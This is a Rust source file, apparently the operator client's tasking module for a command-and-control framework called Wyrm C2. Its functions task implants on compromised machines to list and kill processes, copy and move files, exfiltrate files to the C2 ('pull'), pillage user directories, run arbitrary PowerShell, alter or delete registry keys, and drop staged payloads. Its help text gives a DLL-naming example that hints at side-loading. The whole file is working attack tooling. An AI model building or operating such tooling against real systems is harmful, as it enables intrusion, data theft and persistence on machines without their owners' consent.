use std::{mem::take, sync::Arc};

use axum::extract::State;
use chrono::{DateTime, Utc};
use shared::{
    pretty_print::{print_failed, print_success},
    task_types::{RegAddInner, RegQueryInner, RegType},
    tasks::{AdminCommand, DELIM_FILE_DROP_METADATA, FileDropMetadata, WyrmResult},
};
use thiserror::Error;

use crate::{
    models::{AppState, TabConsoleMessages},
    net::{ApiError, Credentials, IsTaskingAgent, IsTaskingAgentErr, api_request},
    tasks::utils::{DiscardFirst, split_string_slices_to_n, validate_reg_type},
};

#[derive(Debug, Error)]
pub enum TaskDispatchError {
    #[error("API Error {0}.")]
    Api(#[from] ApiError),
    #[error("Bad tokens in input {0}")]
    BadTokens(String),
    #[error("Agent ID not present in task dispatch")]
    AgentIdMissing(#[from] IsTaskingAgentErr),
    #[error("Failed to deserialise data. {0}")]
    DeserialisationError(#[from] serde_json::Error),
}

pub async fn list_processes(
    creds: &Credentials,
    agent: &IsTaskingAgent<'_>,
) -> Result<(), TaskDispatchError> {
    agent.has_agent_id()?;

    let _ = api_request(AdminCommand::ListProcesses, agent, creds, None).await?;

    Ok(())
}

pub async fn change_directory(
    new_dir: &[&str],
    creds: &Credentials,
    agent: &IsTaskingAgent<'_>,
) -> Result<(), TaskDispatchError> {
    agent.has_agent_id()?;

    let new_dir = new_dir.join(" ").trim().to_string();

    api_request(AdminCommand::Cd(new_dir), agent, creds, None).await?;

    Ok(())
}

pub async fn kill_agent(
    creds: &Credentials,
    agent: &IsTaskingAgent<'_>,
    state: State<Arc<AppState>>,
) -> Result<(), TaskDispatchError> {
    agent.has_agent_id()?;

    api_request(AdminCommand::KillAgent, agent, creds, None).await?;

    if let IsTaskingAgent::Yes(agent_id) = agent {
        {
            let mut agents_lock = state.connected_agents.write().await;
            agents_lock.retain(|a| a.agent_id != agent_id.as_str());
        }
        {
            let mut lock = state.active_tabs.write().await;
            let pos = lock.1.iter().position(|a| a == *agent_id);
            if let Some(pos) = pos {
                // Do not remove index 0
                if pos > 0 {
                    lock.1.remove(pos);
                    lock.0 = lock.0.saturating_sub(1);
                }
            }
        }
    }
    Ok(())
}

pub async fn kill_process(
    creds: &Credentials,
    agent: &IsTaskingAgent<'_>,
    pid: &&str,
) -> Result<(), TaskDispatchError> {
    agent.has_agent_id()?;

    // Validate, even through we pass a String - check it client side
    let pid_as_int: i32 = pid.parse().unwrap_or(0);
    if pid.is_empty() || pid_as_int == 0 {
        return Err(TaskDispatchError::BadTokens(
            "No pid or non-numeric supplied.".into(),
        ));
    }

    api_request(
        AdminCommand::KillProcessById(pid.to_string()),
        agent,
        creds,
        None,
    )
    .await?;

    Ok(())
}

/// Dispatching function for instructing the agent to copy a file.
///
/// # Args
/// - `from`: Where to copy from
/// - `to`: Where to copy to`
pub async fn copy_file(
    raw_input: String,
    creds: &Credentials,
    agent: &IsTaskingAgent<'_>,
) -> Result<(), TaskDispatchError> {
    agent.has_agent_id()?;

    let (from, to) = match split_string_slices_to_n(2, &raw_input, DiscardFirst::Chop) {
        Some(mut inner) => {
            let from = take(&mut inner[0]);
            let to = take(&mut inner[1]);
            (from, to)
        }
        None => {
            return Err(TaskDispatchError::BadTokens(
                "Could not get data from tokens in copy_file.".into(),
            ));
        }
    };

    api_request(AdminCommand::Copy((from, to)), agent, creds, None).await?;

    Ok(())
}

/// Dispatching function for instructing the agent to copy a file.
///
/// # Args
/// - `from`: Where to copy from
/// - `to`: Where to copy to`
pub async fn move_file(
    raw_input: String,
    creds: &Credentials,
    agent: &IsTaskingAgent<'_>,
) -> Result<(), TaskDispatchError> {
    agent.has_agent_id()?;
    let (from, to) = match split_string_slices_to_n(2, &raw_input, DiscardFirst::Chop) {
        Some(mut inner) => {
            let from = take(&mut inner[0]);
            let to = take(&mut inner[1]);
            (from, to)
        }
        None => {
            return Err(TaskDispatchError::BadTokens(
                "Could not get data from tokens in move_file.".into(),
            ));
        }
    };

    api_request(
        AdminCommand::Move((from.to_string(), to.to_string())),
        agent,
        creds,
        None,
    )
    .await?;

    Ok(())
}

/// Pull a single file from the target machine
pub async fn pull_file(
    target: String,
    creds: &Credentials,
    agent: &IsTaskingAgent<'_>,
) -> Result<(), TaskDispatchError> {
    agent.has_agent_id()?;

    if target.is_empty() {
        print_failed(format!("Please specify a target file."));
    }

    let target = match split_string_slices_to_n(1, &target, DiscardFirst::Chop) {
        Some(mut inner) => take(&mut inner[0]),
        None => {
            return Err(TaskDispatchError::BadTokens(
                "Could not get data from tokens in pull_file.".into(),
            ));
        }
    };

    api_request(AdminCommand::Pull(target.to_string()), agent, creds, None).await?;

    Ok(())
}

pub async fn remove_agent(
    creds: &Credentials,
    agent: &IsTaskingAgent<'_>,
    state: State<Arc<AppState>>,
) -> Result<(), TaskDispatchError> {
    agent.has_agent_id()?;
    api_request(AdminCommand::RemoveAgentFromList, &agent, creds, None).await?;

    // Remove agent from connected_agents
    if let IsTaskingAgent::Yes(agent_id) = agent {
        let mut agents_lock = state.connected_agents.write().await;
        agents_lock.retain(|a| a.agent_id != agent_id.as_str());
        // Remove tab
        let mut lock = state.active_tabs.write().await;
        let pos = lock.1.iter().position(|a| a == *agent_id);
        if let Some(pos) = pos {
            // Do not remove index 0
            if pos > 0 {
                lock.1.remove(pos);
                lock.0 = lock.0.saturating_sub(1);
            }
        }
    }
    Ok(())
}

pub fn exit() {
    print_success("Thank you for using Wyrm C2!");
    std::process::exit(0);
}

pub fn unknown_command() -> Result<(), TaskDispatchError> {
    print_failed(
        "Unknown command or you did not supply the correct number of arguments. Type \"help {command}\" \
        to see the instructions for that command.",
    );

    Err(TaskDispatchError::BadTokens("Unknown command or you did not supply the correct number of arguments. Type \"help {command}\" \
            to see the instructions for that command.".into()))
}

pub async fn set_sleep(
    sleep_time: &str,
    creds: &Credentials,
    agent: &IsTaskingAgent<'_>,
) -> Result<(), TaskDispatchError> {
    agent.has_agent_id()?;

    let sleep_time: i64 = match sleep_time.parse() {
        Ok(s) => s,
        Err(e) => {
            return Err(TaskDispatchError::BadTokens(format!(
                "Could not parse new sleep time. {e}"
            )));
        }
    };

    // As on the C2 we need the sleep time to be an i64, but the implant needs it to be a u64,
    // we want to make sure we aren't going to get any overflow behaviour which could lead to
    // denial of service or other errors. We check the input number is not less than or = to 0.
    // We do not need to check the upper bound because an i64 MAX will fit into a u64.
    if sleep_time <= 0 {
        return Err(TaskDispatchError::BadTokens(
            "Sleep time must be greater than 1 (second)".into(),
        ));
    }

    api_request(AdminCommand::Sleep(sleep_time), agent, creds, None).await?;

    Ok(())
}

/// Clears the terminal of the selected tab / agent for the operator. This does not clear the database.
pub async fn clear_terminal(
    agent: &IsTaskingAgent<'_>,
    state: State<Arc<AppState>>,
) -> Result<(), TaskDispatchError> {
    if let IsTaskingAgent::Yes(agent_id) = agent {
        let mut lock = state.connected_agents.write().await;

        if let Some(agent_obj) = lock
            .iter_mut()
            .find(|a: &&mut crate::models::Agent| a.agent_id == **agent_id)
        {
            agent_obj.output_messages.clear();
        }
    }

    Ok(())
}

pub async fn pwd(creds: &Credentials, agent: &IsTaskingAgent<'_>) -> Result<(), TaskDispatchError> {
    agent.has_agent_id()?;

    api_request(AdminCommand::Pwd, agent, creds, None).await?;

    Ok(())
}

pub async fn dir_listing(
    creds: &Credentials,
    agent: &IsTaskingAgent<'_>,
) -> Result<(), TaskDispatchError> {
    agent.has_agent_id()?;

    api_request(AdminCommand::Ls, agent, creds, None).await?;

    Ok(())
}

pub async fn show_server_time(
    creds: &Credentials,
    state: State<Arc<AppState>>,
) -> Result<(), TaskDispatchError> {
    let result = api_request(
        AdminCommand::ShowServerTime,
        &IsTaskingAgent::No,
        creds,
        None,
    )
    .await?;

    let deserialised_response: DateTime<Utc> = serde_json::from_slice(&result)?;

    let mut lock = state.connected_agents.write().await;

    if let Some(server_tab) = lock.get_mut(0) {
        server_tab
            .output_messages
            .push(TabConsoleMessages::non_agent_message(
                "ServerTime".into(),
                deserialised_response.to_string(),
            ));
    }

    Ok(())
}

pub async fn pillage(
    creds: &Credentials,
    agent: &IsTaskingAgent<'_>,
) -> Result<(), TaskDispatchError> {
    agent.has_agent_id()?;

    api_request(AdminCommand::ListUsersDirs, agent, creds, None).await?;

    Ok(())
}

/// Show the help menu to the user
pub async fn show_help(
    agent: &IsTaskingAgent<'_>,
    state: State<Arc<AppState>>,
) -> Result<(), TaskDispatchError> {
    let messages: Vec<String> = vec![
        "help [command]".into(),
        "exit (Exit's the client)".into(),
        "servertime (Shows the local time of the server)".into(),
        "n (Gets new notifications for the agent)".into(),
        "kill_agent (terminates the agent on the endpoint)".into(),
        "remove_agent (removes the agent from the interface; until it reconnects)".into(),
        "cls | clear (clears the terminal)".into(),
        "".into(),
        "set sleep [time SECONDS]".into(),
        "ps".into(),
        "cd [relative path | absolute path]".into(),
        "pwd".into(),
        "ls".into(),
        "cp <from> <to> | copy <from> <to> (accepts relative or absolute paths)".into(),
        "mv <from> <to> | move <from> <to> (accepts relative or absolute paths)".into(),
        "pull <path> (Exfiltrates a file to the C2. For more info, type help pull.)".into(),
        "pillage".into(),
        "run".into(),
        "kill <pid>".into(),
        "drop <server recognised name> <filename to drop on disk (including extension)>".into(),
        "reg query <path_to_key>".into(),
        "reg query <path_to_key> <value> (for more info, type help reg)".into(),
        "reg add <path_to_key> <value name> <value data> <data type> (for more info, type help reg)".into(),
        "reg del <path_to_key> <Optional: value name> (for more info, type help reg)".into(),
    ];

    if let IsTaskingAgent::Yes(agent_id) = agent {
        let mut lock = state.connected_agents.write().await;

        if let Some(agent_obj) = lock
            .iter_mut()
            .find(|a: &&mut crate::models::Agent| a.agent_id == **agent_id)
        {
            agent_obj.output_messages.push(TabConsoleMessages {
                event: "HelpMenu".into(),
                time: "-".into(),
                messages,
            });
        }
    }

    Ok(())
}

/// Shows help for a specified command where further details are available
pub async fn show_help_for_command(
    agent: &IsTaskingAgent<'_>,
    state: State<Arc<AppState>>,
    command: &str,
) -> Result<(), TaskDispatchError> {
    let messages: Vec<String> = match command {
        "drop" => vec![
            "Drops a file to disk. The file dropped must be staged on the C2 first, otherwise the process will not complete.".into(),
            "This command will drop the payload into the CURRENT working directory of the agent.".into(),
            "Arg1: The colloquial server name for the file you are dropping (appears in the Staged Resources panel as the 'Name' column)".into(),
            "Arg2: The destination filename of what you want to drop, if you want this file to have an extension, you must included that.".into(),
            "          For example, if dropping a DLL staged as my_dll, you may wish to do: drop my_dll version.dll, which will save the DLL as version.dll on disk.".into(),
        ],
        "pull" => vec![
            "Usage: pull <file path>".into(),
            "Exfiltrates a file to the C2 by its file path, which can be relative or absolute. This will upload the file to the".into(),
            "C2 and save it under: c2/<target hostname>/<file path as per targets full path>.".into(),
            "If a file already exists at that location, it will be overwritten. Note, using `pull` will cause the file to be read into memory".into(),
            "on the target machine in full, thus you should only use this on files which are smaller than the amount of available RAM on the machine.".into(),
            "Streamed `pull` is coming in a future release.".into(),
        ],
        "reg query" => vec![
            "Usage: reg query <path_to_key> <OPTIONAL: value>".into(),
            "Queries the registry by a path to the key, with an optional value if you wish to query only a specific value".into(),
            "If the path contains whitespace, ensure you wrap it in \"quotes\".".into(),
        ],
        "reg" => vec![
            "reg query".into(),
            "Usage: reg query <path_to_key> <OPTIONAL: value>".into(),
            "Queries the registry by a path to the key, with an optional value if you wish to query only a specific value".into(),
            "If the path contains whitespace, ensure you wrap it in \"quotes\".".into(),
            "".into(),
            "".into(),
            "reg add".into(),
            "Usage: reg add <path_to_key> <value name> <value data> <data type>".into(),
            "Modifies the registry by either adding a new key if it did not already exist, or updating an existing key.".into(),
            "For the data type, you should specify either: string, DWORD, or QWORD depending on the data you are writing.".into(),
            "You can then check the addition by running reg query <args>.".into(),
            "".into(),
            "".into(),
            "reg del".into(),
            "Usage: reg del <path_to_key> <Optional: value name>".into(),
            "Deletes a registry key, or value, based on above args. Deleting the key will delete all sub-keys under it, so take care.".into(),
        ],
        _ => vec!["No help pages available for this command, or it does not exist.".into()],
    };

    if let IsTaskingAgent::Yes(agent_id) = agent {
        let mut lock = state.connected_agents.write().await;

        if let Some(agent_obj) = lock
            .iter_mut()
            .find(|a: &&mut crate::models::Agent| a.agent_id == **agent_id)
        {
            agent_obj.output_messages.push(TabConsoleMessages {
                event: "HelpMenu".into(),
                time: "-".into(),
                messages,
            });
        }
    }

    Ok(())
}

pub async fn run_powershell_command(
    args: &[&str],
    creds: &Credentials,
    agent: &IsTaskingAgent<'_>,
) -> Result<(), TaskDispatchError> {
    agent.has_agent_id()?;

    let mut args_string: String = String::new();
    for arg in args {
        args_string += arg;
        args_string += " ";
    }

    let args_trimmed = args_string.trim().to_string();

    api_request(AdminCommand::Run(args_trimmed), agent, creds, None).await?;

    Ok(())
}

/// Instructs the agent to drop a staged file onto disk on the target endpoint.
pub async fn file_dropper(
    args: &[&str],
    creds: &Credentials,
    agent: &IsTaskingAgent<'_>,
    state: State<Arc<AppState>>,
) -> Result<(), TaskDispatchError> {
    agent.has_agent_id()?;

    if args.len() != 2 {
        return Err(TaskDispatchError::BadTokens(
            "Invalid number of args passed into the `drop` command.".into(),
        ));
    }

    if args[0].contains(DELIM_FILE_DROP_METADATA) || args[1].contains(DELIM_FILE_DROP_METADATA) {
        return Err(TaskDispatchError::BadTokens(
            "Input cannot contain a comma.".into(),
        ));
    }

    let file_data = FileDropMetadata {
        internal_name: args[0].to_string(),
        download_name: args[1].to_string(),
        // This is computed on the C2
        download_uri: None,
    };

    let response = api_request(AdminCommand::Drop(file_data), agent, creds, None).await?;

    let result = serde_json::from_slice::<WyrmResult<String>>(&response)
        .expect("could not deser response from Drop");

    if let WyrmResult::Err(e) = result {
        if let IsTaskingAgent::Yes(agent_id) = agent {
            let mut lock = state.connected_agents.write().await;
            for a in lock.iter_mut() {
                if a.agent_id == **agent_id {
                    a.output_messages
                        .push(TabConsoleMessages::non_agent_message("[Drop]".into(), e));
                    break;
                }
            }
        }
    }

    Ok(())
}

pub enum RegOperationDelQuery {
    Query,
    Delete,
}

/// Queries or deletes a registry key.
///
/// Arg for [`RegOperationDelQuery`] specifies the tasking.
pub async fn reg_query_del(
    inputs: String,
    creds: &Credentials,
    agent: &IsTaskingAgent<'_>,
    operation: RegOperationDelQuery,
) -> Result<(), TaskDispatchError> {
    agent.has_agent_id()?;

    if inputs.is_empty() {
        print_failed(format!("Please specify options."));
    }

    //
    // We have a max of 2 values we can get from this task. The first is specifying a key and value,
    // second is just the key.
    //
    // The strategy here is to try resolve 2 strings in the input, if that fails, we try 1 string, then we have
    // the proper options
    //

    let reg_query_options = split_string_slices_to_n(2, &inputs, DiscardFirst::ChopTwo);
    let mut reg_query_options = if reg_query_options.is_none() {
        match split_string_slices_to_n(1, &inputs, DiscardFirst::ChopTwo) {
            Some(s) => s,
            None => {
                return Err(TaskDispatchError::BadTokens(
                    "Could not find options for command".into(),
                ));
            }
        }
    } else {
        reg_query_options.unwrap()
    };

    let query_data: RegQueryInner = if reg_query_options.len() == 2 {
        (
            take(&mut reg_query_options[0]),
            Some(take(&mut reg_query_options[1])),
        )
    } else {
        (take(&mut reg_query_options[0]), None)
    };

    match operation {
        RegOperationDelQuery::Query => {
            api_request(AdminCommand::RegQuery(query_data), agent, creds, None).await?;
        }
        RegOperationDelQuery::Delete => {
            api_request(AdminCommand::RegDelete(query_data), agent, creds, None).await?;
        }
    }

    Ok(())
}

/// Queries a registry key
pub async fn reg_add(
    inputs: String,
    creds: &Credentials,
    agent: &IsTaskingAgent<'_>,
) -> Result<(), TaskDispatchError> {
    agent.has_agent_id()?;

    if inputs.is_empty() {
        print_failed(format!("Please specify options."));
    }

    //
    // We have a max of 2 values we can get from this task. The first is specifying a key and value,
    // second is just the key.
    //
    // The strategy here is to try resolve 2 strings in the input, if that fails, we try 1 string, then we have
    // the proper options
    //

    let reg_add_options = split_string_slices_to_n(4, &inputs, DiscardFirst::ChopTwo);
    let mut reg_add_options = if reg_add_options.is_none() {
        return Err(TaskDispatchError::BadTokens(
            "Could not find options for command".into(),
        ));
    } else {
        reg_add_options.unwrap()
    };

    let reg_type = match reg_add_options[3].as_str() {
        "string" | "String" => RegType::String,
        "u32" | "U32" | "dword" | "DWORD" => RegType::U32,
        "u64" | "U64" | "qword" | "QWORD" => RegType::U64,
        _ => {
            return Err(TaskDispatchError::BadTokens(
                "Could not extrapolate type, the final param should be either string, dword, or qword depending on the data type".into(),
            ));
        }
    };

    // Validate input before we get to the implant..
    if validate_reg_type(reg_add_options[2].as_str(), reg_type).is_err() {
        return Err(TaskDispatchError::BadTokens(format!(
            "Could not parse value for the type specified. Tried parsing {} as {}",
            reg_add_options[2], reg_add_options[3],
        )));
    };

    let query_data: RegAddInner = (
        take(&mut reg_add_options[0]),
        take(&mut reg_add_options[1]),
        take(&mut reg_add_options[2]),
        reg_type,
    );

    api_request(AdminCommand::RegAdd(query_data), agent, creds, None).await?;

    Ok(())
}
